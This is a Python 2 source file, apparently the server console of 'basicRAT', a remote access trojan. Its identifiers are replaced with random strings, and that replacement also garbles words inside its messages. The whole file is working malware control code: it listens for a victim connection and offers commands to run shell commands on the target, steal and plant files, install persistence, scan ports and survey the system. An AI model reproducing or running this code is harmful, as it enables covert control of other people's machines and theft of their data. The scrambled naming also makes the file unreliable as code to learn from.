#!/usr/bin/env python
# -*- coding: utf-8 -*-
import argparse
import readline
import socket
import struct
import sys
import time
try:
    from core.crypto import JwCsVFlvwSXxzwZKpzKYaxboNPDvwiug,atPheiSoAtFBPAPiSWphKMBoMpifCYtC,VxWgDmRXKUkHaoZGUVlfsqoqGmMDDtWS
    from core.filesock import KbuhTZtIvVSBvshIvIaoAxspIPzFrRTF, uNZFEeimqaxXIxuHxoqgUngTOwwhLTrZ
except ImportError as TlyLZGCjMyfkGQXgBRNEjBhFzbBqaMZP:
    print TlyLZGCjMyfkGQXgBRNEjBhFzbBqaMZP
    sys.exit(0)
bthbTYYqqUetBhzFOQddgGDhYHJbcTGE = '''
download <files>    - Download file(s).
help                - Show this help menu.
persistence         - Apply persistence mechanism.
quit                - Gracefully kill client and server.
rekey               - Regenerate crypto key.
run <command>       - Execute a command on the target.
scan <ip>           - Scan top 25 ports on a single host.
survey              - Run a system survey.
unzip <file>        - Unzip a file.
upload <files>      - Upload files(s).
wget <url>          - Download a file from the web.
'''
poUcaWYPPhrSPynFbxlywzAZtYLuRCnq = '''
______           _     ______  ___ _____   _            _
| ___ \         (_)    | ___ \/ _ \_   _| | |          | |
| |_/ / __ _ ___ _  ___| |_/ / /_\ \| |   | |_ ___  ___| |_
| ___ \/ _` / __| |/ __|    /|  _  || |   | __/ _ \/ __| __|
| |_/ / (_| \__ \ | (__| |\ \| | | || |   | ||  __/\__ \ |_
\____/ \__,_|___/_|\___\_| \_\_| |_/\_/    \__\___||___/\__|
'''
XOwEBrJGASSBvrRdJUWiMTWGMsGMGOkr = [ 'download', 'help', 'persistence', 'quit', 'rekey', 'run',
             'scan', 'survey', 'unzip', 'upload', 'wget' ]
def oPXKaaKoQKCCxsQAbNLvESBsqwMfCjdC():
    oOLjORHOEPTBvbMxqjtxyPtmrebAVmfQ = argparse.ArgumentParser(description='basicRAT server')
    oOLjORHOEPTBvbMxqjtxyPtmrebAVmfQ.add_argument('-p', '--port', help='Port to listen on.',
                        default=1337, type=int)
    return oOLjORHOEPTBvbMxqjtxyPtmrebAVmfQ
def CxwkuaYxAsqyzyRZGAgajIPQUXTcbOKw():
    oOLjORHOEPTBvbMxqjtxyPtmrebAVmfQ  = oPXKaaKoQKCCxsQAbNLvESBsqwMfCjdC()
    gUAsIWNxqQlhBWMaeSUtATWnehnPqlRR    = vars(oOLjORHOEPTBvbMxqjtxyPtmrebAVmfQ.parse_args())
    vzuxGFTGLeWQNeYjkcuIvXXBDQsIrMtu    = gUAsIWNxqQlhBWMaeSUtATWnehnPqlRR['port']
    CbHagqpBcIpeEWUyuBbobjCzudqKrPsR = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        CbHagqpBcIpeEWUyuBbobjCzudqKrPsR.bind(('0.0.0.0', vzuxGFTGLeWQNeYjkcuIvXXBDQsIrMtu))
    except socket.error:
        print 'Error: Unable to start DpHxMbqtwYrYxBYzSMIcLuBCkkFQKRTR, vzuxGFTGLeWQNeYjkcuIvXXBDQsIrMtu {} in use?'.format(vzuxGFTGLeWQNeYjkcuIvXXBDQsIrMtu)
        sys.exit(1)
    for xmlOqWbzaGVfPtHPNJsYsjFeYMnvEfEc in poUcaWYPPhrSPynFbxlywzAZtYLuRCnq.split('\n'):
        time.sleep(0.05)
        print xmlOqWbzaGVfPtHPNJsYsjFeYMnvEfEc
    print 'basicRAT DpHxMbqtwYrYxBYzSMIcLuBCkkFQKRTR listening on vzuxGFTGLeWQNeYjkcuIvXXBDQsIrMtu {}...'.format(vzuxGFTGLeWQNeYjkcuIvXXBDQsIrMtu)
    CbHagqpBcIpeEWUyuBbobjCzudqKrPsR.listen(10)
    NpXjClAPjkPxJajGJxBLnIdInhmTKvcx, kwckTXuWeZMiKmxjUMaaAuYKRwcOqwEU = CbHagqpBcIpeEWUyuBbobjCzudqKrPsR.accept()
    uFmdOymcMMeyJWWaNAHNrjHsxxQEDFtk = VxWgDmRXKUkHaoZGUVlfsqoqGmMDDtWS(NpXjClAPjkPxJajGJxBLnIdInhmTKvcx, DpHxMbqtwYrYxBYzSMIcLuBCkkFQKRTR=True)
    while True:
        PTmpynUaaHkwtErwxRgvPDKmPUzflyVj = raw_input('\n[{}] basicRAT> '.format(kwckTXuWeZMiKmxjUMaaAuYKRwcOqwEU[0])).rstrip()
        if not PTmpynUaaHkwtErwxRgvPDKmPUzflyVj:
            continue
        WoCuDsjrJqkBtrVSNvPIXnePXoPTYVaa, _, MbYRjLcfsjWAuINTJevWTdDSCsNvjQFf = PTmpynUaaHkwtErwxRgvPDKmPUzflyVj.partition(' ')
        if WoCuDsjrJqkBtrVSNvPIXnePXoPTYVaa not in XOwEBrJGASSBvrRdJUWiMTWGMsGMGOkr:
            print 'Invalid command, type "help" to see BydkDdrxdfAXrftvAKyrifGnDywBhZhq list of commands.'
            continue
        if WoCuDsjrJqkBtrVSNvPIXnePXoPTYVaa == 'help':
            print bthbTYYqqUetBhzFOQddgGDhYHJbcTGE
            continue
        NpXjClAPjkPxJajGJxBLnIdInhmTKvcx.send(atPheiSoAtFBPAPiSWphKMBoMpifCYtC(PTmpynUaaHkwtErwxRgvPDKmPUzflyVj, uFmdOymcMMeyJWWaNAHNrjHsxxQEDFtk))
        if WoCuDsjrJqkBtrVSNvPIXnePXoPTYVaa == 'quit':
            CbHagqpBcIpeEWUyuBbobjCzudqKrPsR.close()
            sys.exit(0)
        elif WoCuDsjrJqkBtrVSNvPIXnePXoPTYVaa == 'run':
            bxSqVLoAoFSyTtQlNIxBlLtMFMEAucSJ = NpXjClAPjkPxJajGJxBLnIdInhmTKvcx.recv(4096)
            print JwCsVFlvwSXxzwZKpzKYaxboNPDvwiug(bxSqVLoAoFSyTtQlNIxBlLtMFMEAucSJ, uFmdOymcMMeyJWWaNAHNrjHsxxQEDFtk).rstrip()
        elif WoCuDsjrJqkBtrVSNvPIXnePXoPTYVaa == 'download':
            for EaleibjntEwBrEGEpOACJgDqRDRDdRnP in MbYRjLcfsjWAuINTJevWTdDSCsNvjQFf.split():
                EaleibjntEwBrEGEpOACJgDqRDRDdRnP = EaleibjntEwBrEGEpOACJgDqRDRDdRnP.strip()
                KbuhTZtIvVSBvshIvIaoAxspIPzFrRTF(NpXjClAPjkPxJajGJxBLnIdInhmTKvcx, EaleibjntEwBrEGEpOACJgDqRDRDdRnP, uFmdOymcMMeyJWWaNAHNrjHsxxQEDFtk)
        elif WoCuDsjrJqkBtrVSNvPIXnePXoPTYVaa == 'upload':
            for EaleibjntEwBrEGEpOACJgDqRDRDdRnP in MbYRjLcfsjWAuINTJevWTdDSCsNvjQFf.split():
                EaleibjntEwBrEGEpOACJgDqRDRDdRnP = EaleibjntEwBrEGEpOACJgDqRDRDdRnP.strip()
                uNZFEeimqaxXIxuHxoqgUngTOwwhLTrZ(NpXjClAPjkPxJajGJxBLnIdInhmTKvcx, EaleibjntEwBrEGEpOACJgDqRDRDdRnP, uFmdOymcMMeyJWWaNAHNrjHsxxQEDFtk)
        elif WoCuDsjrJqkBtrVSNvPIXnePXoPTYVaa == 'rekey':
            uFmdOymcMMeyJWWaNAHNrjHsxxQEDFtk = VxWgDmRXKUkHaoZGUVlfsqoqGmMDDtWS(NpXjClAPjkPxJajGJxBLnIdInhmTKvcx, DpHxMbqtwYrYxBYzSMIcLuBCkkFQKRTR=True)
        elif WoCuDsjrJqkBtrVSNvPIXnePXoPTYVaa in ['scan', 'survey', 'persistence', 'unzip', 'wget']:
            print 'Running {}...'.format(WoCuDsjrJqkBtrVSNvPIXnePXoPTYVaa)
            bxSqVLoAoFSyTtQlNIxBlLtMFMEAucSJ = NpXjClAPjkPxJajGJxBLnIdInhmTKvcx.recv(1024)
            print JwCsVFlvwSXxzwZKpzKYaxboNPDvwiug(bxSqVLoAoFSyTtQlNIxBlLtMFMEAucSJ, uFmdOymcMMeyJWWaNAHNrjHsxxQEDFtk)
if __name__ == '__main__':
    CxwkuaYxAsqyzyRZGAgajIPQUXTcbOKw()
